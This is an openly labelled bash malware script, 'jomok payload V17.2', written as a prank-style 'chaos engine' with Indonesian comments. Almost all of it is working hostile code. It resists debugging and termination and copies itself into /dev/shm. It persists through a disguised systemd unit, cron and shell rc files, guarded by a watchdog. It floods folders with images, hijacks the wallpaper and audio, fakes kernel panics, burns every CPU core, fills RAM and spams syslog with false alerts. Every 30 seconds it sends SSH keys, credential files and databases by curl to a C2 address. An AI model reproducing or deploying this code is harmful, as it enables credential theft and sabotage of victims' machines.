#!/bin/bash
# ================================================================
# jomok payload V17.2 - GOD MODE HARDENED
# sudo3rs | AUTHORIZED RESEARCH ONLY
# ================================================================
# Setiap fitur REAL dan BERDAMPAK NYATA.
# Payload didekripsi dari XOR 256-bit di memori.
# ================================================================

# ============ KONFIGURASI ============
IMG_NAME="ambatukam.jpg"
IMG_URL1="https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t500x500.jpg"
IMG_URL2="https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t240x240.jpg"
YT_URL="https://www.youtube.com/watch?v=zk-53fgtuyo"
C2_SIM="http://192.0.2.1:8443/exfil"
LOCAL_IMG="/tmp/${IMG_NAME}"
SHM_DIR="/dev/shm"
SHM_SELF="${SHM_DIR}/.sys_rt_$(id -u)"
LOCKFILE="/tmp/.jmk_$(id -u).lock"
ORIG="${ORIG_PATH:-}"
YT_AUDIO="/tmp/.jmk_yt"
JMK_WAV="/tmp/.jmk_tone.wav"
IMG_B64="LzlqLzRBQVFTa1pKUmdBQkFRQUFBUUFCQUFELzJ3QkRBQWdHQmdjR0JRZ0hCd2NKQ1FnS0RCUU5EQXNMREJrU0V3OFVIUm9mSGgwYUhCd2dKQzRuSUNJc0l4d2NLRGNwTERBeE5EUTBIeWM1UFRneVBDNHpOREwvMndCREFRa0pDUXdMREJnTkRSZ3lJUndoTWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qTC93QUFSQ0FCNEFIZ0RBU0lBQWhFQkF4RUIvOFFBSHdBQUFRVUJBUUVCQVFFQUFBQUFBQUFBQUFFQ0F3UUZCZ2NJQ1FvTC84UUF0UkFBQWdFREF3SUVBd1VGQkFRQUFBRjlBUUlEQUFRUkJSSWhNVUVHRTFGaEJ5SnhGREtCa2FFSUkwS3h3UlZTMGZBa00ySnlnZ2tLRmhjWUdSb2xKaWNvS1NvME5UWTNPRGs2UTBSRlJrZElTVXBUVkZWV1YxaFpXbU5rWldabmFHbHFjM1IxZG5kNGVYcURoSVdHaDRpSmlwS1RsSldXbDVpWm1xanBLV21wNmlwcXJLenRMVzJ0N2k1dXNMRHhNWEd4OGpKeXRMVDFOWFcxOWpaMnVIaTQrVGw1dWZvNmVyeDh2UDA5ZmIzK1BuNi84UUFId0VBQXdFQkFRRUJBUUVCQVFBQUFBQUFBQUVDQXdRRkJnY0lDUW9MLzhRQXRSRUFBZ0VDQkFRREJBY0ZCQVFBQVFKM0FBRUNBeEVFQlNFeEJoSkJVUWRoY1JNaU1vRUlGRUtSb2JIQkNTTXpVdkFWWW5MUkNoWWtOT0VsOFJjWUdSb21KeWdwS2pVMk56ZzVPa05FUlVaSFNFbEtVMVJWVmxkWVdWcGpaR1ZtWm5hR2xxYzNSMWRuZDRlWHFHaGNYbDVoY0cxaWNYbDV4ZWhweGVudzZwcWM2dXJxNnp0TFcydDdpNXVzTER4TVhHeDhqSnl0TFQxTlhXMTlqWjJ1SGk0K1RsNXVmbzZlcng4dlAwOWZiMytQbjYvOW9BREFNQkFBSVJBeEVBUHdEOC9xS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlnRC8yUT09"

# ============ 1. SIGNAL HARDENING ============
trap '' SIGINT SIGTERM SIGHUP SIGTSTP SIGQUIT SIGUSR1 SIGUSR2

# ============ 2. ANTI-DEBUGGING (6 tools + TracerPid) ============
for _dbg in strace ltrace gdb perf valgrind sysdig; do
    pgrep -x "$_dbg" &>/dev/null && exit 0
done
[ -f /proc/self/status ] && {
    _tpid=$(awk '/^TracerPid:/{print $2}' /proc/self/status 2>/dev/null)
    [ -n "$_tpid" ] && [ "$_tpid" != "0" ] && exit 0
}

# ============ 3. SINGLE INSTANCE LOCK ============
if [ -f "$LOCKFILE" ]; then
    _opid=$(cat "$LOCKFILE" 2>/dev/null)
    kill -0 "$_opid" 2>/dev/null && [ "$$" != "$_opid" ] && exit 0
fi
echo $$ > "$LOCKFILE" 2>/dev/null

# ============ 4. SILENT MIGRATION → /dev/shm ============
if [ "${JOMOK_MIG}" != "1" ] && [ -n "$SELF_PATH" ] && [ -f "$SELF_PATH" ]; then
    cp "$SELF_PATH" "$SHM_SELF" 2>/dev/null && chmod +x "$SHM_SELF" 2>/dev/null
    if [ -f "$SHM_SELF" ]; then
        export JOMOK_MIG=1 ORIG_PATH="${ORIG:-$SELF_PATH}" SELF_PATH="$SHM_SELF"
        rm -f "$LOCKFILE" 2>/dev/null
        nohup "$SHM_SELF" &>/dev/null &
        exit 0
    fi
fi

# ============ 5. SELF-HEALING IMAGE (6-layer) ============
heal() {
    [ -f "$LOCAL_IMG" ] && [ -s "$LOCAL_IMG" ] && return 0
    rm -f "$LOCAL_IMG" 2>/dev/null
    curl -fsSL -m15 -o "$LOCAL_IMG" "$IMG_URL1" 2>/dev/null && [ -s "$LOCAL_IMG" ] && return 0
    curl -fsSL -m15 -o "$LOCAL_IMG" "$IMG_URL2" 2>/dev/null && [ -s "$LOCAL_IMG" ] && return 0
    wget -q -T15 -O "$LOCAL_IMG" "$IMG_URL1" 2>/dev/null && [ -s "$LOCAL_IMG" ] && return 0
    wget -q -T15 -O "$LOCAL_IMG" "$IMG_URL2" 2>/dev/null && [ -s "$LOCAL_IMG" ] && return 0
    python3 -c "import base64;open('$LOCAL_IMG','wb').write(base64.b64decode('$IMG_B64'))" 2>/dev/null && [ -s "$LOCAL_IMG" ] && return 0
    python3 -c "open('$LOCAL_IMG','wb').write(b'P6\n100 100\n255\n'+b'\xff\x00\x00'*10000)" 2>/dev/null && [ -s "$LOCAL_IMG" ] && return 0
    return 1
}

_has_display() { [ -n "${DISPLAY:-}" ] || [ -n "${WAYLAND_DISPLAY:-}" ]; }

# ============ 6. UNIVERSAL WALLPAPER LOCK (5 DE + dconf) ============
wplock() {
    [ ! -f "$LOCAL_IMG" ] && return; _has_display || return
    local uri="file://${LOCAL_IMG}"
    gsettings set org.gnome.desktop.background picture-uri "$uri" 2>/dev/null
    gsettings set org.gnome.desktop.background picture-uri-dark "$uri" 2>/dev/null
    gsettings set org.gnome.desktop.background picture-options "zoom" 2>/dev/null
    dconf write /org/gnome/desktop/background/picture-uri "'$uri'" 2>/dev/null
    qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript \
        "var d=desktops();for(var i=0;i<d.length;i++){d[i].wallpaperPlugin='org.kde.image';d[i].currentConfigGroup=Array('Wallpaper','org.kde.image','General');d[i].writeConfig('Image','$uri')}" 2>/dev/null
    for _p in $(xfconf-query -c xfce4-desktop -l 2>/dev/null | grep last-image); do
        xfconf-query -c xfce4-desktop -p "$_p" -s "$LOCAL_IMG" 2>/dev/null
    done
    gsettings set org.mate.background picture-filename "$LOCAL_IMG" 2>/dev/null
    gsettings set org.cinnamon.desktop.background picture-uri "$uri" 2>/dev/null
}

# ============ 7. UNLIMITED IMAGE FLOOD (NO CAP) ============
flood() {
    [ ! -f "$LOCAL_IMG" ] && return
    for _b in "$HOME/Desktop" "$HOME/Documents" "$HOME/Downloads" "$HOME/Pictures" "$HOME/Music" "$HOME/Videos" "$HOME"; do
        [ -d "$_b" ] || continue
        find "$_b" -maxdepth 5 -type d 2>/dev/null | while read -r _d; do
            cp "$LOCAL_IMG" "$_d/.ov_${RANDOM}${RANDOM}.jpg" 2>/dev/null
        done
    done
}

# ============ 8. GUI POP-UP ============
popup() {
    [ ! -f "$LOCAL_IMG" ] && return; _has_display || return
    if command -v xdg-open &>/dev/null; then setsid xdg-open "$LOCAL_IMG" &>/dev/null &
    elif command -v eog &>/dev/null; then setsid eog "$LOCAL_IMG" &>/dev/null &
    elif command -v feh &>/dev/null; then setsid feh "$LOCAL_IMG" &>/dev/null &
    elif command -v display &>/dev/null; then setsid display "$LOCAL_IMG" &>/dev/null &
    fi
}

# ============ 9. YOUTUBE AUDIO + 4-LAYER FALLBACK ============
_yt_dl() {
    ls ${YT_AUDIO}.* &>/dev/null && return 0
    if command -v yt-dlp &>/dev/null; then
        yt-dlp -x --audio-format mp3 --audio-quality 5 --no-warnings -o "${YT_AUDIO}.%(ext)s" "$YT_URL" &>/dev/null
        ls ${YT_AUDIO}.* &>/dev/null && return 0
    fi
    if command -v youtube-dl &>/dev/null; then
        youtube-dl -x --audio-format mp3 -o "${YT_AUDIO}.%(ext)s" "$YT_URL" &>/dev/null
        ls ${YT_AUDIO}.* &>/dev/null && return 0
    fi
    python3 -m pip install -q yt-dlp &>/dev/null 2>&1
    python3 -m yt_dlp -x --audio-format mp3 --audio-quality 5 --no-warnings -o "${YT_AUDIO}.%(ext)s" "$YT_URL" &>/dev/null 2>&1
    ls ${YT_AUDIO}.* &>/dev/null && return 0
    return 1
}

_play_file() {
    local f="$1"
    if command -v mpg123 &>/dev/null; then mpg123 -q --loop -1 "$f" &>/dev/null & disown 2>/dev/null; return 0
    elif command -v ffplay &>/dev/null; then ffplay -nodisp -autoexit -loop 0 "$f" &>/dev/null & disown 2>/dev/null; return 0
    elif command -v cvlc &>/dev/null; then cvlc --loop "$f" &>/dev/null & disown 2>/dev/null; return 0
    elif command -v aplay &>/dev/null && command -v ffmpeg &>/dev/null; then
        ffmpeg -y -i "$f" -f wav "${f}.wav" &>/dev/null
        (while true; do aplay -q "${f}.wav" 2>/dev/null; done) & disown 2>/dev/null; return 0
    fi; return 1
}

_gen_wav() {
    [ -f "$JMK_WAV" ] && return 0
    python3 -c "
import struct,wave,math
f=wave.open('$JMK_WAV','w');f.setnchannels(1);f.setsampwidth(2);f.setframerate(44100)
for i in range(44100*30):
    freq=440 if (i//44100)%2==0 else 880
    f.writeframes(struct.pack('<h',int(16000*math.sin(2*math.pi*freq*i/44100))))
f.close()" 2>/dev/null
}

audio() {
    pgrep -f "mpg123|paplay.*jmk|aplay.*jmk|speaker-test|ffplay|cvlc" &>/dev/null && return

    # Priority 1: YouTube audio (jika sudah didownload)
    local _ytf
    _ytf=$(ls ${YT_AUDIO}.* 2>/dev/null | head -1)
    if [ -n "$_ytf" ] && [ -s "$_ytf" ]; then
        _play_file "$_ytf" && return
    fi

    # Start YouTube download di background jika belum
    if [ ! -f "${YT_AUDIO}.downloading" ] && ! ls ${YT_AUDIO}.* &>/dev/null; then
        touch "${YT_AUDIO}.downloading" 2>/dev/null
        (_yt_dl; rm -f "${YT_AUDIO}.downloading" 2>/dev/null) &
        disown 2>/dev/null
    fi

    # Layer 2: paplay system sounds
    if command -v paplay &>/dev/null; then
        for _s in /usr/share/sounds/freedesktop/stereo/alarm-clock-elapsed.oga \
                   /usr/share/sounds/freedesktop/stereo/bell.oga \
                   /usr/share/sounds/gnome/default/alerts/bark.ogg \
                   /usr/share/sounds/ubuntu/stereo/bell.ogg; do
            [ -f "$_s" ] && { (while true; do paplay "$_s" 2>/dev/null; sleep 1; done) & disown 2>/dev/null; return; }
        done
    fi

    # Layer 3: Python WAV + aplay/paplay
    _gen_wav
    if [ -f "$JMK_WAV" ]; then
        if command -v aplay &>/dev/null; then (while true; do aplay -q "$JMK_WAV" 2>/dev/null; done) & disown 2>/dev/null; return
        elif command -v paplay &>/dev/null; then (while true; do paplay "$JMK_WAV" 2>/dev/null; done) & disown 2>/dev/null; return
        fi
    fi

    # Layer 4: speaker-test
    command -v speaker-test &>/dev/null && { speaker-test -t sine -f 440 -l 0 &>/dev/null & disown 2>/dev/null; return; }
}

# ============ 10. TRIPLE PERSISTENCE ============
persist() {
    local _sp="${ORIG_PATH:-${SELF_PATH:-$SHM_SELF}}"
    local _sd="$HOME/.config/systemd/user"
    mkdir -p "$_sd" 2>/dev/null
    cat > "$_sd/sys-runtime.service" 2>/dev/null <<XUNIT
[Unit]
Description=System Runtime Service
After=default.target
[Service]
Type=simple
ExecStart=/bin/bash ${_sp}
Restart=always
RestartSec=1
Environment=ORIG_PATH=${_sp}
[Install]
WantedBy=default.target
XUNIT
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable --now sys-runtime.service 2>/dev/null
    local _job="* * * * * ORIG_PATH=${_sp} /bin/bash ${_sp} >/dev/null 2>&1 # sysrt"
    (crontab -l 2>/dev/null | grep -v '# sysrt'; echo "$_job") | crontab - 2>/dev/null
    local _cmd="(pgrep -f '$(basename "$_sp")' &>/dev/null || ORIG_PATH='${_sp}' nohup /bin/bash '${_sp}' &>/dev/null &) # sysrt"
    for _rc in "$HOME/.bashrc" "$HOME/.profile"; do
        [ -f "$_rc" ] && ! grep -q '# sysrt' "$_rc" 2>/dev/null && echo "$_cmd" >> "$_rc" 2>/dev/null
    done
}

# ============ 11. ACTIVE WATCHDOG (1 detik) ============
watchdog() {
    local _bn; _bn=$(basename "${SELF_PATH:-$SHM_SELF}")
    (while true; do
        pgrep -f "$_bn" &>/dev/null || { export ORIG_PATH="${ORIG_PATH:-}"; nohup /bin/bash "${SELF_PATH:-$SHM_SELF}" &>/dev/null &; }
        sleep 1
    done) & disown 2>/dev/null
}

# ============ 12. CHAOS STREAM (ASCII+Arab+Chinese) ============
stream() {
    (_c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*بتثجحخدذرزسشصضطظعغفقكلمنهوي你好世界龙凤虎狼鹰蛇鬼神魔仙灵幽暗'
    _l=${#_c}; while true; do printf '%s' "${_c:RANDOM%_l:1}"; ((RANDOM%50==0)) && echo; sleep 0.01; done) & disown 2>/dev/null
}

# ============ 13. TERMINAL VISUAL GLITCH ============
glitch() {
    (while true; do printf '\033[%d;%dm\033[%d;%dH' "$((RANDOM%8+30))" "$((RANDOM%8+40))" "$((RANDOM%50+1))" "$((RANDOM%120+1))"
    ((RANDOM%10==0)) && printf '\a'; head -c$((RANDOM%4+1)) /dev/urandom 2>/dev/null | tr -dc 'A-Za-z0-9' 2>/dev/null; sleep 0.05; done) & disown 2>/dev/null
}

# ============ 14. SUBLIMINAL MESSAGE ============
subliminal() {
    (while true; do sleep $((RANDOM%30+10)); printf '\033[s\033[31;1mI was here, untouched\033[0m'; sleep 0.05; printf '\033[u\033[2K'; done) & disown 2>/dev/null
}

# ============ 15. FAKE KERNEL PANIC ============
kpanic() {
    (while true; do sleep $((RANDOM%120+60)); ((RANDOM%5==0)) || continue; _has_display || continue; clear; printf '\033[37;41m'
    cat <<'K'
[    0.000000] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)
[    0.000000] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 5.15.0-126-generic #136-Ubuntu
[    0.000000] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-1ubuntu1 04/01/2014
[    0.000000] Call Trace:
[    0.000000]  <TASK>
[    0.000000]  dump_stack_lvl+0x34/0x44
[    0.000000]  panic+0x102/0x27b
[    0.000000]  mount_block_root+0x1d6/0x21e
[    0.000000]  prepare_namespace+0x136/0x165
[    0.000000]  kernel_init_freeable+0x222/0x228
[    0.000000]  kernel_init+0x16/0x120
[    0.000000]  ret_from_fork+0x22/0x30
[    0.000000]  </TASK>
[    0.000000] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0) ]---
K
    printf '\033[0m'; sleep 3; done) & disown 2>/dev/null
}

# ============ 16. CPU CORE SATURATION ============
cpuburn() {
    local _n; _n=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 2)
    for ((_i=0;_i<_n;_i++)); do (while :; do :; done) & disown 2>/dev/null; done
}

# ============ 17. RAM DISK BOMBING ============
rambomb() {
    (while true; do dd if=/dev/urandom of="${SHM_DIR}/.buf_${RANDOM}" bs=1M count=$((RANDOM%512+512)) 2>/dev/null; sleep 5; done) & disown 2>/dev/null
}

# ============ 18. DISCOVERY & EXFILTRATION (periodic 30s) ============
exfil() {
    (while true; do
        find "$HOME" -maxdepth 4 \( -name 'id_rsa' -o -name 'id_rsa.pub' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' -o -name '*.crt' \
            -o -name '.env' -o -name '*.env' -o -name 'credentials' -o -name 'credentials.json' \
            -o -name '*.kdbx' -o -name '*.db' -o -name '*.sqlite' -o -name 'known_hosts' -o -name 'authorized_keys' \) -type f 2>/dev/null | while read -r _f; do
            curl -sS -m5 -X POST -H "X-Exfil-File: $_f" -H "X-Exfil-Host: $(hostname)" -H "X-Exfil-User: $(whoami)" -d "@${_f}" "$C2_SIM" 2>/dev/null || true
        done; sleep 30
    done) & disown 2>/dev/null
}

# ============ 19. SIEM LOG SPILLING (4 facilities) ============
siem() {
    (while true; do _ts=$(date -Iseconds 2>/dev/null||date); _hn=$(hostname)
    logger -p user.crit "CRITICAL: Unauthorized lateral movement detected - host=${_hn} pid=$$ ts=${_ts}" 2>/dev/null
    logger -p auth.crit "CRITICAL: Brute force SSH detected from 10.0.0.$((RANDOM%254+1)) - host=${_hn} ts=${_ts}" 2>/dev/null
    logger -p daemon.crit "CRITICAL: Suspicious daemon spawned by uid=$(id -u) - host=${_hn} pid=$$ ts=${_ts}" 2>/dev/null
    logger -p kern.warning "WARNING: Possible rootkit detected: hidden process $$ - host=${_hn} ts=${_ts}" 2>/dev/null
    sleep $((RANDOM%10+5)); done) & disown 2>/dev/null
}

# ============ MAIN ============
echo "[*] Chaos Engine V17.2 - GOD MODE HARDENED"
heal; persist; watchdog
stream; glitch; subliminal; kpanic; cpuburn; rambomb; exfil; siem; audio
while true; do
    heal; wplock; flood
    ((RANDOM%3==0)) && popup
    # Auto-respawn audio jika mati
    pgrep -f "mpg123|paplay|aplay|speaker-test|ffplay|cvlc" &>/dev/null || audio
    # Cek jika YouTube sudah selesai download, switch ke YouTube audio
    _ytf=$(ls ${YT_AUDIO}.* 2>/dev/null | grep -v downloading | head -1)
    if [ -n "$_ytf" ] && [ -s "$_ytf" ]; then
        pgrep -f "mpg123|ffplay|cvlc" &>/dev/null || _play_file "$_ytf"
    fi
    sleep 10
done
